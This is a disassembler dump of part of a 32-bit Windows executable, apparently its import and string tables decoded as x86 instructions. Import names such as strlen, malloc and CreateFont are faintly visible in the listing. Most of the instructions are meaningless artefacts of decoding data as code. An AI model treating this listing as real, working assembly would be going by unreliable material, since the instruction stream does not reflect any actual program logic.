  4125bb:	add    dl,dh
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    dh,bh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	add    BYTE PTR [eax],al
  4125c7:	add    BYTE PTR [edx],bl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [esi],ch
  4125cd:	sub    eax,DWORD PTR [ecx]
  4125cf:	add    BYTE PTR [esi],bh
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4125d7:	add    BYTE PTR [eax+0x2b],bl
  4125da:	add    DWORD PTR [eax],eax
  4125dc:	push   0x7e00012b
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    BYTE PTR [edx-0x59fffed5],dl
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4125f2:	add    DWORD PTR [eax],eax
  4125f4:	loopne 0x412621
  4125f6:	add    DWORD PTR [eax],eax
  4125f8:	in     al,dx
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    dh,bh
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    BYTE PTR [esi],dl
  412601:	sub    al,0x1
  412603:	add    BYTE PTR [eax],ch
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [eax],bh
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [edx+0x2c],al
  41260e:	add    DWORD PTR [eax],eax
  412610:	pop    eax
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [edx+0x2c],dh
  412616:	add    DWORD PTR [eax],eax
  412618:	jle    0x412646
  41261a:	add    DWORD PTR [eax],eax
  41261c:	mov    ch,BYTE PTR [ecx+eax*1]
  41261f:	add    BYTE PTR [esi-0x47fffed4],bl
  412625:	sub    al,0x1
  412627:	add    ah,al
  412629:	sub    al,0x1
  41262b:	add    dl,dl
  41262d:	sub    al,0x1
  41262f:	add    ah,ah
  412631:	sub    al,0x1
  412633:	add    al,dh
  412635:	sub    al,0x1
  412637:	add    BYTE PTR [esi],al
  412639:	sub    eax,0x2d140001
  41263e:	add    DWORD PTR [eax],eax
  412640:	and    ch,BYTE PTR ds:0x2d300001
  412646:	add    DWORD PTR [eax],eax
  412648:	dec    edx
  412649:	sub    eax,0x2d5e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	push   0x2d
  412652:	add    DWORD PTR [eax],eax
  412654:	jp     0x412683
  412656:	add    DWORD PTR [eax],eax
  412658:	xchg   esi,eax
  412659:	sub    eax,0x2da60001
  41265e:	add    DWORD PTR [eax],eax
  412660:	mov    dh,0x2d
  412662:	add    DWORD PTR [eax],eax
  412664:	(bad)  
  412665:	sub    eax,0x2dd20001
  41266a:	add    DWORD PTR [eax],eax
  41266c:	loop   0x41269b
  41266e:	add    DWORD PTR [eax],eax
  412670:	hlt    
  412671:	sub    eax,0x2dfe0001
  412676:	add    DWORD PTR [eax],eax
  412678:	push   cs
  412679:	add    DWORD PTR cs:[eax],eax
  41267c:	push   ds
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	sub    BYTE PTR [esi],ch
  412682:	add    DWORD PTR [eax],eax
  412684:	add    BYTE PTR [eax],al
  412686:	add    BYTE PTR [eax],al
  412688:	dec    edx
  412689:	add    DWORD PTR cs:[eax],eax
  41268c:	add    BYTE PTR [eax],al
  41268e:	add    BYTE PTR [eax],al
  412690:	push   0x8000012e
  412695:	add    DWORD PTR cs:[eax],eax
  412698:	mov    WORD PTR [esi],gs
  41269a:	add    DWORD PTR [eax],eax
  41269c:	call   0x12e:0xb200012e
  4126a3:	add    dh,al
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	fsubr  QWORD PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0xf84127df
  4126b1:	add    DWORD PTR cs:[eax],eax
  4126b4:	adc    BYTE PTR [edi],ch
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	push   ds
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	xor    BYTE PTR [edi],ch
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	inc    eax
  4126c1:	das    
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	push   esi
  4126c5:	das    
  4126c6:	add    DWORD PTR [eax],eax
  4126c8:	data16 das 
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	jbe    0x4126fd
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	mov    ch,BYTE PTR [edi]
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	xchg   esi,eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	mov    dl,0x2f
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	enter  0x12f,0x0
  4126e4:	loopne 0x412715
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	hlt    
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	add    dh,BYTE PTR [eax]
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	sbb    BYTE PTR [eax],dh
  4126f2:	add    DWORD PTR [eax],eax
  4126f4:	xor    BYTE PTR cs:[ecx],al
  4126f7:	add    BYTE PTR [edx],bh
  4126f9:	xor    BYTE PTR [ecx],al
  4126fb:	add    BYTE PTR [eax+0x30],cl
  4126fe:	add    DWORD PTR [eax],eax
  412700:	push   edx
  412701:	xor    BYTE PTR [ecx],al
  412703:	add    BYTE PTR [esi+0x30],ah
  412706:	add    DWORD PTR [eax],eax
  412708:	jbe    0x41273a
  41270a:	add    DWORD PTR [eax],eax
  41270c:	mov    dh,BYTE PTR [eax]
  41270e:	add    DWORD PTR [eax],eax
  412710:	pushf  
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax-0x3bfffed0],dh
  412719:	xor    BYTE PTR [ecx],al
  41271b:	add    ah,dl
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    dl,ch
  412721:	xor    BYTE PTR [ecx],al
  412723:	add    BYTE PTR [edx],al
  412725:	xor    DWORD PTR [ecx],eax
  412727:	add    BYTE PTR [edx],bl
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [esi],ah
  41272d:	xor    DWORD PTR [ecx],eax
  41272f:	add    BYTE PTR [eax],bh
  412731:	xor    DWORD PTR [ecx],eax
  412733:	add    BYTE PTR [edx+0x31],cl
  412736:	add    DWORD PTR [eax],eax
  412738:	push   esi
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [eax+0x31],ch
  41273e:	add    DWORD PTR [eax],eax
  412740:	jbe    0x412773
  412742:	add    DWORD PTR [eax],eax
  412744:	xor    BYTE PTR [ecx],0x1
  412747:	add    BYTE PTR [esi-0x59fffecf],dl
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    BYTE PTR [eax-0x2dfffecf],bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    dl,ch
  412759:	xor    DWORD PTR [ecx],eax
  41275b:	add    BYTE PTR [eax],al
  41275d:	add    BYTE PTR [eax],al
  41275f:	add    BYTE PTR [esi],al
  412761:	xor    al,BYTE PTR [ecx]
  412763:	add    BYTE PTR [edx+esi*1],bl
  412766:	add    DWORD PTR [eax],eax
  412768:	xor    dh,BYTE PTR [edx]
  41276a:	add    DWORD PTR [eax],eax
  41276c:	inc    edx
  41276d:	xor    al,BYTE PTR [ecx]
  41276f:	add    BYTE PTR [edx+0x32],dl
  412772:	add    DWORD PTR [eax],eax
  412774:	pusha  
  412775:	xor    al,BYTE PTR [ecx]
  412777:	add    BYTE PTR [eax+0x32],dh
  41277a:	add    DWORD PTR [eax],eax
  41277c:	test   BYTE PTR [edx],dh
  41277e:	add    DWORD PTR [eax],eax
  412780:	xchg   esp,eax
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    BYTE PTR [eax-0x41fffece],ch
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,cl
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    al,ah
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    al,dh
  412795:	xor    al,BYTE PTR [ecx]
  412797:	add    BYTE PTR [edx],al
  412799:	xor    eax,DWORD PTR [ecx]
  41279b:	add    BYTE PTR [edx],bl
  41279d:	xor    eax,DWORD PTR [ecx]
  41279f:	add    BYTE PTR [esi],ah
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1],dh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	inc    esp
  4127a9:	xor    eax,DWORD PTR [ecx]
  4127ab:	add    BYTE PTR [edx+0x33],dl
  4127ae:	add    DWORD PTR [eax],eax
  4127b0:	push   0x7a000133
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi-0x6bfffecd],al
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    BYTE PTR [esi-0x4bfffecd],ah
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    dh,al
  4127c9:	xor    eax,DWORD PTR [ecx]
  4127cb:	add    al,bl
  4127cd:	xor    eax,DWORD PTR [ecx]
  4127cf:	add    dl,ch
  4127d1:	xor    eax,DWORD PTR [ecx]
  4127d3:	add    dl,bh
  4127d5:	xor    eax,DWORD PTR [ecx]
  4127d7:	add    BYTE PTR [esi],al
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [esp+esi*1],bl
  4127de:	add    DWORD PTR [eax],eax
  4127e0:	cmp    BYTE PTR [ecx+eax*1],dh
  4127e3:	add    BYTE PTR [edx+0x34],dl
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	data16 xor al,0x1
  4127eb:	add    BYTE PTR [esp+esi*1+0x1],dh
  4127ef:	add    BYTE PTR [eax-0x6dfffecc],al
  4127f5:	xor    al,0x1
  4127f7:	add    BYTE PTR [edx-0x51fffecc],ah
  4127fd:	xor    al,0x1
  4127ff:	add    BYTE PTR [edx-0x37fffecc],bh
  412805:	xor    al,0x1
  412807:	add    al,ah
  412809:	xor    al,0x1
  41280b:	add    al,dh
  41280d:	xor    al,0x1
  41280f:	add    BYTE PTR [eax],cl
  412811:	xor    eax,0x351a0001
  412816:	add    DWORD PTR [eax],eax
  412818:	sub    dh,BYTE PTR ds:0x35380001
  41281e:	add    DWORD PTR [eax],eax
  412820:	dec    edx
  412821:	xor    eax,0x35580001
  412826:	add    DWORD PTR [eax],eax
  412828:	fs xor eax,0x35720001
  41282e:	add    DWORD PTR [eax],eax
  412830:	jl     0x412867
  412832:	add    DWORD PTR [eax],eax
  412834:	xchg   esp,eax
  412835:	xor    eax,0x35a40001
  41283a:	add    DWORD PTR [eax],eax
  41283c:	mov    ah,0x35
  41283e:	add    DWORD PTR [eax],eax
  412840:	ret    0x135
  412843:	add    al,dl
  412845:	xor    eax,0x35e00001
  41284a:	add    DWORD PTR [eax],eax
  41284c:	div    BYTE PTR ds:0x36080001
  412852:	add    DWORD PTR [eax],eax
  412854:	push   ss
  412855:	add    DWORD PTR ss:[eax],eax
  412858:	sub    al,0x36
  41285a:	add    DWORD PTR [eax],eax
  41285c:	cmp    dh,BYTE PTR [esi]
  41285e:	add    DWORD PTR [eax],eax
  412860:	push   edx
  412861:	add    DWORD PTR ss:[eax],eax
  412864:	pop    esi
  412865:	add    DWORD PTR ss:[eax],eax
  412868:	push   0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	jbe    0x4128a4
  41286e:	add    DWORD PTR [eax],eax
  412870:	test   BYTE PTR [esi],dh
  412872:	add    DWORD PTR [eax],eax
  412874:	xchg   esi,eax
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	mov    ds:0xb4000136,al
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	shl    BYTE PTR [esi],0x1
  412883:	add    dh,cl
  412885:	add    DWORD PTR ss:[eax],eax
  412888:	fdiv   QWORD PTR [esi]
  41288a:	add    DWORD PTR [eax],eax
  41288c:	call   0xf64129c7
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	add    al,0x37
  412896:	add    DWORD PTR [eax],eax
  412898:	adc    al,0x37
  41289a:	add    DWORD PTR [eax],eax
  41289c:	es aaa 
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	cmp    al,0x37
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	inc    esi
  4128a5:	aaa    
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	push   esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	fs aaa 
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	jbe    0x4128e9
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	test   BYTE PTR [edi],dh
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	cwde   
  4128b9:	aaa    
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    dl,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	les    esi,FWORD PTR [edi]
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	aam    0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	call   0xfa412a04
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	or     bh,BYTE PTR [eax]
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	push   ss
  4128d5:	cmp    BYTE PTR [ecx],al
  4128d7:	add    BYTE PTR [eax+edi*1],dh
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	inc    esi
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1+0x1],bl
  4128e3:	add    BYTE PTR [eax+0x38],bh
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	nop
  4128e9:	cmp    BYTE PTR [ecx],al
  4128eb:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	mov    edx,0xc8000138
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    ah,ah
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dl,dh
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    BYTE PTR [esi],al
  412905:	cmp    DWORD PTR [ecx],eax
  412907:	add    BYTE PTR [eax],bl
  412909:	cmp    DWORD PTR [ecx],eax
  41290b:	add    BYTE PTR [edx],ch
  41290d:	cmp    DWORD PTR [ecx],eax
  41290f:	add    BYTE PTR [edx],bh
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [eax+0x39],dl
  412916:	add    DWORD PTR [eax],eax
  412918:	cmp    WORD PTR [ecx],ax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    al,ch
  412921:	add    esi,DWORD PTR [ebx+0x74]
  412924:	jb     0x412989
  412926:	jo     0x4129a1
  412928:	add    BYTE PTR [eax],al
  41292a:	or     eax,0x676e7504
  41292f:	gs je  0x412995
  412932:	add    BYTE PTR [eax],al
  412934:	pop    edi
  412935:	add    esp,DWORD PTR [ebx+0x6c]
  412938:	gs popa 
  41293a:	jb     0x4129a1
  41293c:	jb     0x4129b0
  41293e:	add    BYTE PTR [eax],al
  412940:	sub    BYTE PTR [edi+esi*2],al
  412943:	arpl   WORD PTR [ebx+0x6e],si
  412946:	arpl   WORD PTR [ebp+0x70],bp
  412949:	add    ch,dh
  41294b:	add    BYTE PTR [edi+0x63],bl
  41294e:	outs   dx,DWORD PTR ds:[esi]
  41294f:	outs   dx,BYTE PTR ds:[esi]
  412950:	je     0x4129c4
  412952:	outs   dx,DWORD PTR ds:[esi]
  412953:	ins    BYTE PTR es:[edi],dx
  412954:	data16 jo 0x412957
  412957:	add    BYTE PTR [ebp+0x6c616d03],dh
  41295d:	ins    BYTE PTR es:[edi],dx
  41295e:	outs   dx,DWORD PTR ds:[esi]
  41295f:	arpl   WORD PTR [eax],ax
  412961:	add    BYTE PTR [ebx+0x735f5f00],dh
  412967:	gs je  0x4129c9
  41296a:	popa   
  41296b:	jo     0x4129dd
  41296d:	pop    edi
  41296e:	je     0x4129e9
  412970:	jo     0x4129d7
  412972:	add    BYTE PTR [eax],al
  412974:	add    eax,DWORD PTR [ebx+esi*2]
  412977:	jns    0x4129ec
  412979:	je     0x4129e0
  41297b:	ins    DWORD PTR es:[edi],dx
  41297c:	add    BYTE PTR [eax],al
  41297e:	mov    al,ds:0x705f5f00
  412983:	pop    edi
  412984:	pop    edi
  412985:	ins    WORD PTR es:[edi],dx
  412987:	outs   dx,DWORD PTR ds:[esi]
  412988:	fs add BYTE PTR gs:[eax],al
  41298c:	pop    ebp
  41298d:	add    esp,DWORD PTR [ebx+0x61]
  412990:	ins    BYTE PTR es:[edi],dx
  412991:	ins    BYTE PTR es:[edi],dx
  412992:	outs   dx,DWORD PTR ds:[esi]
  412993:	arpl   WORD PTR [eax],ax
  412995:	add    BYTE PTR [ebx+0x705f5f00],bl
  41299b:	pop    edi
  41299c:	pop    edi
  41299d:	arpl   WORD PTR [edi+0x6d],bp
  4129a0:	ins    DWORD PTR es:[edi],dx
  4129a1:	outs   dx,DWORD PTR ds:[esi]
  4129a2:	fs add BYTE PTR gs:[eax],al
  4129a6:	std    
  4129a7:	add    esi,DWORD PTR [ebx+0x74]
  4129aa:	jb     0x412a20
  4129ac:	outs   dx,DWORD PTR ds:[esi]
  4129ad:	jne    0x412a1b
  4129af:	add    BYTE PTR [esi],dl
  4129b1:	add    al,0x76
  4129b3:	jae    0x412a25
  4129b5:	jb     0x412a20
  4129b7:	outs   dx,BYTE PTR ds:[esi]
  4129b8:	je     0x412a20
  4129ba:	add    BYTE PTR [eax],al
  4129bc:	sub    al,0x4
  4129be:	ja     0x412a23
  4129c0:	jae    0x412a32
  4129c2:	bound  esi,QWORD PTR [edx+0x6b]
  4129c5:	add    bl,bl
  4129c7:	add    BYTE PTR [edi+0x61],bl
  4129ca:	ins    DWORD PTR es:[edi],dx
  4129cb:	jae    0x412a34
  4129cd:	pop    edi
  4129ce:	gs js  0x412a3a
  4129d1:	je     0x4129d3
  4129d3:	add    BYTE PTR [esi+0x6e695f01],al
  4129d9:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x94006d72
  4129e1:	add    ebp,DWORD PTR [ecx+0x73]
  4129e4:	popa   
  4129e5:	ins    BYTE PTR es:[edi],dx
  4129e6:	outs   dx,BYTE PTR ds:[esi]
  4129e7:	jne    0x412a56
  4129e9:	add    BYTE PTR [ebp+0x3],ch
  4129ec:	data16 addr16 gs je 0x412a54
  4129f1:	add    BYTE PTR [esi+0x73695f01],bl
  4129f7:	ins    DWORD PTR es:[edi],dx
  4129f8:	bound  esp,QWORD PTR [edx+0x6c]
  4129fb:	gs popa 
  4129fd:	add    BYTE PTR fs:[eax],al
  412a00:	pop    ebx
  412a01:	add    esp,DWORD PTR [edx+0x73]
  412a04:	gs popa 
  412a06:	jb     0x412a6b
  412a08:	push   0x7303e500
  412a0d:	je     0x412a81
  412a0f:	arpl   WORD PTR [eax+0x72],bp
  412a12:	add    BYTE PTR [eax],al
  412a14:	push   edx
  412a15:	add    BYTE PTR [edi+0x58],bl
  412a18:	arpl   WORD PTR [eax+0x74],si
  412a1b:	inc    esi
  412a1c:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3e70072
  412a24:	jae    0x412a9a
  412a26:	jb     0x412a8b
  412a28:	outs   dx,DWORD PTR ds:[esi]
  412a29:	ins    BYTE PTR es:[edi],dx
  412a2a:	ins    BYTE PTR es:[edi],dx
  412a2b:	add    BYTE PTR [esi],al
  412a2d:	add    al,0x74
  412a2f:	imul   ebp,DWORD PTR [ebp+0x65],0x3b10000
  412a36:	ins    BYTE PTR es:[edi],dx
  412a37:	outs   dx,DWORD PTR ds:[esi]
  412a38:	arpl   WORD PTR [ecx+0x6c],sp
  412a3b:	je     0x412aa6
  412a3d:	ins    DWORD PTR es:[edi],dx
  412a3e:	add    BYTE PTR gs:[eax],bh
  412a41:	add    al,0x77
  412a43:	arpl   WORD PTR [ebx+0x74],si
  412a46:	outs   dx,DWORD PTR ds:[esi]
  412a47:	jne    0x412ab5
  412a49:	add    BYTE PTR [ecx],ah
  412a4b:	add    al,0x77
  412a4d:	arpl   WORD PTR [ebx+0x63],si
  412a50:	jo     0x412acb
  412a52:	add    BYTE PTR [eax],al
  412a54:	enter  0x7003,0x75
  412a58:	je     0x412abd
  412a5a:	push   0x78007261
  412a5f:	add    esp,DWORD PTR [esi+0x70]
  412a62:	jne    0x412ad8
  412a64:	arpl   WORD PTR [eax],ax
  412a66:	sbb    al,0x4
  412a68:	ja     0x412acd
  412a6a:	jae    0x412acf
  412a6c:	popa   
  412a6d:	je     0x412a6f
  412a6f:	add    dl,ch
  412a71:	add    esi,DWORD PTR [ebx+0x74]
  412a74:	jb     0x412ad9
  412a76:	jae    0x412ae8
  412a78:	outs   dx,BYTE PTR ds:[esi]
  412a79:	add    BYTE PTR [ebx+0x65736603],al
  412a7f:	imul   eax,DWORD PTR gs:[eax],0xffffffb7
  412a83:	add    ebp,DWORD PTR [ebp+0x62]
  412a86:	jae    0x412afc
  412a88:	outs   dx,DWORD PTR ds:[esi]
  412a89:	ja     0x412aee
  412a8b:	jae    0x412a8d
  412a8d:	add    BYTE PTR [ebx],cl
  412a8f:	add    al,0x74
  412a91:	outs   dx,DWORD PTR ds:[esi]
  412a92:	ja     0x412b00
  412a94:	outs   dx,DWORD PTR ds:[esi]
  412a95:	ja     0x412afc
  412a97:	jb     0x412a99
  412a99:	add    ah,cl
  412a9b:	add    esi,DWORD PTR [ecx+0x73]
  412a9e:	outs   dx,DWORD PTR ds:[esi]
  412a9f:	jb     0x412b15
  412aa1:	add    BYTE PTR [ecx],al
  412aa3:	add    al,0x73
  412aa5:	ja     0x412b1a
  412aa7:	arpl   WORD PTR [ecx+0x6e],sp
  412aaa:	data16 add BYTE PTR [ebx],ah
  412aad:	add    DWORD PTR [edi+0x65],ebx
  412ab0:	js     0x412b1b
  412ab2:	je     0x412ab4
  412ab4:	ss add al,0x77
  412ab7:	arpl   WORD PTR [ebx+0x74],si
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	ins    DWORD PTR es:[edi],dx
  412abc:	bound  esi,QWORD PTR [ebx+0x0]
  412abf:	add    al,ch
  412ac1:	add    BYTE PTR [edi+0x63],bl
  412ac4:	gs js  0x412b30
  412ac7:	je     0x412ac9
  412ac9:	add    BYTE PTR [ecx],ch
  412acb:	add    al,0x77
  412acd:	arpl   WORD PTR [ebx+0x6e],si
  412ad0:	arpl   WORD PTR [eax+0x79],si
  412ad3:	add    BYTE PTR [ebx+0x70736903],bl
  412ad9:	jb     0x412b44
  412adb:	outs   dx,BYTE PTR ds:[esi]
  412adc:	je     0x412ade
  412ade:	mov    ch,0x0
  412ae0:	pop    edi
  412ae1:	pop    edi
  412ae2:	jae    0x412b49
  412ae4:	je     0x412b5b
  412ae6:	jae    0x412b4d
  412ae8:	jb     0x412b57
  412aea:	popa   
  412aeb:	je     0x412b55
  412aed:	gs jb  0x412b62
  412af0:	add    BYTE PTR [eax],al
  412af2:	sbb    BYTE PTR [esi+esi*2],al
  412af5:	jae    0x412b6e
  412af7:	jo     0x412b6b
  412af9:	imul   ebp,DWORD PTR [esi+0x74],0x720066
  412b00:	pop    edi
  412b01:	pop    edi
  412b02:	addr16 gs je 0x412b73
  412b06:	popa   
  412b07:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b0e:	dec    ebp
  412b0f:	push   ebx
  412b10:	push   esi
  412b11:	inc    ebx
  412b12:	push   edx
  412b13:	push   esp
  412b14:	cs fs ins BYTE PTR es:[edi],dx
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	add    BYTE PTR [eax],al
  412b1a:	fadd   QWORD PTR [ecx]
  412b1c:	push   ebx
  412b1d:	gs je  0x412b64
  412b20:	dec    ecx
  412b21:	inc    edx
  412b22:	inc    ebx
  412b23:	outs   dx,DWORD PTR ds:[esi]
  412b24:	ins    BYTE PTR es:[edi],dx
  412b25:	outs   dx,DWORD PTR ds:[esi]
  412b26:	jb     0x412b7c
  412b28:	popa   
  412b29:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b2d:	add    bh,dl
  412b2f:	add    DWORD PTR [ebx+0x65],edx
  412b32:	je     0x412b76
  412b34:	jb     0x412bab
  412b36:	jae    0x412ba0
  412b38:	dec    edi
  412b39:	jb     0x412ba2
  412b3b:	inc    ebp
  412b3c:	js     0x412b3e
  412b3e:	add    DWORD PTR [eax],0x626d6f43
  412b44:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  412b4b:	add    BYTE PTR [ecx+eax*1],ah
  412b4e:	inc    edi
  412b4f:	gs je  0x412b94
  412b52:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  412b56:	gs add bh,cl
  412b59:	add    DWORD PTR [ebx+0x65],edx
  412b5c:	ins    BYTE PTR es:[edi],dx
  412b5d:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  412b62:	ins    BYTE PTR es:[edi],dx
  412b63:	gs je  0x412bda
  412b66:	add    BYTE PTR gs:[ecx+0x65724300],cl
  412b6d:	popa   
  412b6e:	je     0x412bd5
  412b70:	inc    edx
  412b71:	jb     0x412be8
  412b73:	jae    0x412bdd
  412b75:	dec    ecx
  412b76:	outs   dx,BYTE PTR ds:[esi]
  412b77:	imul   esi,DWORD PTR fs:[edx+0x65],0xaa007463
  412b7f:	add    BYTE PTR [ebx+0x72],al
  412b82:	gs popa 
  412b84:	je     0x412beb
  412b86:	push   eax
  412b87:	outs   dx,DWORD PTR ds:[esi]
  412b88:	ins    BYTE PTR es:[edi],dx
  412b89:	jns    0x412bf2
  412b8b:	outs   dx,DWORD PTR ds:[esi]
  412b8c:	outs   dx,BYTE PTR ds:[esi]
  412b8d:	push   edx
  412b8e:	outs   dx,BYTE PTR ds:[si]
  412b90:	add    BYTE PTR [eax],al
  412b92:	mov    al,ds:0x65724300
  412b97:	popa   
  412b98:	je     0x412bff
  412b9a:	dec    eax
  412b9b:	popa   
  412b9c:	je     0x412c01
  412b9e:	push   0x73757242
  412ba3:	push   0x17a0000
  412ba8:	inc    edi
  412ba9:	gs je  0x412bff
  412bac:	jns    0x412c21
  412bae:	je     0x412c15
  412bb0:	ins    DWORD PTR es:[edi],dx
  412bb1:	push   eax
  412bb2:	popa   
  412bb3:	ins    BYTE PTR es:[edi],dx
  412bb4:	gs je  0x412c2b
  412bb7:	gs push ebp
  412bb9:	jae    0x412c20
  412bbb:	add    BYTE PTR [esi+0x65724300],bl
  412bc1:	popa   
  412bc2:	je     0x412c29
  412bc4:	inc    esi
  412bc5:	outs   dx,DWORD PTR ds:[esi]
  412bc6:	outs   dx,BYTE PTR ds:[esi]
  412bc7:	je     0x412c20
  412bc9:	add    BYTE PTR [ebp+0x65724300],bl
  412bcf:	popa   
  412bd0:	je     0x412c37
  412bd2:	inc    esi
  412bd3:	outs   dx,DWORD PTR ds:[esi]
  412bd4:	outs   dx,BYTE PTR ds:[esi]
  412bd5:	je     0x412c20
  412bd7:	outs   dx,BYTE PTR ds:[esi]
  412bd8:	imul   esi,DWORD PTR fs:[edx+0x65],0x577463
  412be0:	mov    ah,0x1
  412be2:	push   eax
  412be3:	outs   dx,DWORD PTR ds:[esi]
  412be4:	ins    BYTE PTR es:[edi],dx
  412be5:	jns    0x412c53
  412be7:	imul   ebp,DWORD PTR [esi+0x65],0x18a0000
  412bee:	inc    edi
  412bef:	gs je  0x412c46
  412bf2:	gs js  0x412c69
  412bf5:	dec    ebp
  412bf6:	gs je  0x412c6b
  412bf9:	imul   esp,DWORD PTR [ebx+0x73],0x20d0041
  412c00:	push   esp
  412c01:	jb     0x412c64
  412c03:	outs   dx,BYTE PTR ds:[esi]
  412c04:	jae    0x412c72
  412c06:	popa   
  412c07:	je     0x412c6e
  412c09:	inc    ebx
  412c0a:	push   0x65737261
  412c0f:	je     0x412c5a
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	outs   dx,WORD PTR ds:[esi]
  412c14:	add    BYTE PTR [eax],al
  412c16:	lar    edx,WORD PTR [ebp+0x6e]
  412c1a:	jb     0x412c81
  412c1c:	popa   
  412c1d:	ins    BYTE PTR es:[edi],dx
  412c1e:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  412c25:	arpl   WORD PTR [eax+eax*1+0x41],si
  412c29:	add    DWORD PTR [edi+0x65],eax
  412c2c:	je     0x412c72
  412c2e:	gs jbe 0x412c9a
  412c31:	arpl   WORD PTR [ebp+0x43],sp
  412c34:	popa   
  412c35:	jo     0x412caa
  412c37:	add    BYTE PTR [ecx+0x1],dh
  412c3a:	inc    edi
  412c3b:	gs je  0x412c90
  412c3e:	dec    edi
  412c3f:	push   eax
  412c40:	xor    al,BYTE PTR [eax]
  412c42:	les    eax,FWORD PTR [eax]
  412c44:	inc    ebp
  412c45:	outs   dx,BYTE PTR ds:[esi]
  412c46:	jne    0x412cb5
  412c48:	inc    esi
  412c49:	outs   dx,DWORD PTR ds:[esi]
  412c4a:	outs   dx,BYTE PTR ds:[esi]
  412c4b:	je     0x412c93
  412c4d:	popa   
  412c4e:	ins    DWORD PTR es:[edi],dx
  412c4f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  412c57:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  412c5e:	je     0x412cc5
  412c60:	inc    esp
